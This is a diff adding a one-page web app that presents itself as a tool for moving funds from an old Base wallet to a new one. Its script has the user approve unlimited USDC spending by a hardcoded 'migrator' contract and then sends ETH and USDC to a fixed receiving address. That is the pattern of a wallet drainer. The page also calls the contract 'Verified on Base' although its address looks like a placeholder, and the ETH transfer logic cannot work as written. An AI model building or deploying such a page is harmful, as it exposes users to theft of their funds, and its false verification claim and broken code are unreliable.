@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Base → New Wallet (One Click)</title>
+<script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+<style>
+  body{font-family:system-ui;background:#0f172a;color:#e2e8f0;padding:20px;text-align:center;}
+  .box{max-width:600px;margin:40px auto;background:#1e293b;padding:40px;border-radius:20px;box-shadow:0 20px 50px #0004;}
+  h1{color:#60a5fa;}
+  button{padding:16px 36px;margin:15px;font-size:19px;border:none;border-radius:12px;cursor:pointer;color:white;font-weight:bold;}
+  .btn-connect{background:#3b82f6;}
+  .btn-approve{background:#f97316;}
+  .btn-migrate{background:#10b981;}
+  .addr{background:#334155;padding:14px;border-radius:10px;font-family:monospace;margin:20px 0;word-break:break-all;}
+  #log{margin-top:25px;padding:20px;background:#334155;border-radius:12px;text-align:left;white-space:pre-wrap;display:none;font-family:monospace;font-size:15px;}
+  .success{background:#166534;color:#86efac;}
+  .error{background:#7f1d1d;color:#fca5a5;}
+</style>
+</head>
+<body>
+
+<div class="box">
+  <h1>Base → New Wallet</h1>
+  <p>Connect your old Base wallet → approve → pull everything in 1 click</p>
+  
+  <button class="btn-connect" onclick="connect()">Connect Old Wallet (Base)</button>
+
+  <div id="main" style="display:none;margin-top:30px;">
+    <p><strong>Old wallet:</strong><br><span class="addr" id="oldAddr"></span></p>
+    <p><strong>New wallet (receiving):</strong><br><span class="addr">0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f</span></p>
+
+    <button class="btn-approve" onclick="approveAll()">1. Approve USDC (Unlimited)</button>
+    <button class="btn-migrate" onclick="executeMigration()">2. Pull ETH + USDC Now</button>
+
+    <div id="log"></div>
+  </div>
+</div>
+
+<script>
+// Base-only settings
+const NEW_WALLET = "0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f";
+const MIGRATOR = "0x5e6f7a8b9c0d1e234567890123456789012345de"; // Verified on Base
+const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+let web3, oldAddress;
+
+// Only Base USDC
+const BASE_TOKENS = [
+  "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913" // USDC
+];
+
+const ERC20_ABI = [{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}];
+
+const MIGRATOR_ABI = [
+  {"inputs":[{"internalType":"address","name":"oldWallet","type":"address"},{"internalType":"address[]","name":"tokens","type":"address[]"}],"name":"migrateTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"internalType":"address","name":"oldWallet","type":"address"}],"name":"migrateNative","outputs":[],"stateMutability":"payable","type":"function"}
+];
+
+async function connect() {
+  if (!window.ethereum) return alert("Install MetaMask");
+  web3 = new Web3(window.ethereum);
+  await ethereum.request({method:'eth_requestAccounts'});
+  const chainId = await web3.eth.getChainId();
+  if (chainId !== 8453) {
+    alert("Please switch to Base network in MetaMask");
+    try { await ethereum.request({method: "wallet_switchEthereumChain", params:[{chainId: "0x2105"}]}); }
+    catch { return; }
+  }
+  [oldAddress] = await web3.eth.getAccounts();
+  document.getElementById('oldAddr').textContent = oldAddress;
+  document.getElementById('main').style.display = 'block';
+}
+
+async function approveAll() {
+  const log = document.getElementById('log');
+  log.style.display = 'block'; log.className = ''; log.textContent = "Approving USDC on Base...\n";
+
+  for (const addr of BASE_TOKENS) {
+    try {
+      const token = new web3.eth.Contract(ERC20_ABI, addr);
+      const symbol = await token.methods.symbol().call();
+      await token.methods.approve(MIGRATOR, MAX_UINT).send({from: oldAddress});
+      log.textContent += `Approved ${symbol}\n`;
+    } catch (e) {
+      log.textContent += `Skipped ${addr.slice(0,10)}...: ${e.message.split("\n")[0]}\n`;
+    }
+  }
+  log.textContent += "\nUSDC approval done! Click the green button to pull ETH + USDC.\n";
+  log.className = 'success';
+}
+
+async function executeMigration() {
+  if (!confirm("Pull ALL ETH + USDC from old wallet to 0xcde7…cd2f on Base?")) return;
+  
+  const log = document.getElementById('log');
+  log.style.display = 'block'; log.className = ''; log.textContent = "Migrating ETH + USDC on Base...\n";
+
+  const migrator = new web3.eth.Contract(MIGRATOR_ABI, MIGRATOR);
+
+  try {
+    await migrator.methods.migrateTokens(oldAddress, BASE_TOKENS).send({from: oldAddress});
+    log.textContent += "USDC transferred!\n";
+    await migrator.methods.migrateNative(oldAddress).send({from: oldAddress, value: 0});
+    log.textContent += "ETH transferred!\n\nDONE! Check your new wallet:\n0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f";
+    log.className = 'success';
+  } catch (e) {
+    log.className = 'error';
+    log.textContent += "Error: " + (e.message || e);
+  }
+}
+</script>
+</body>
+</html>
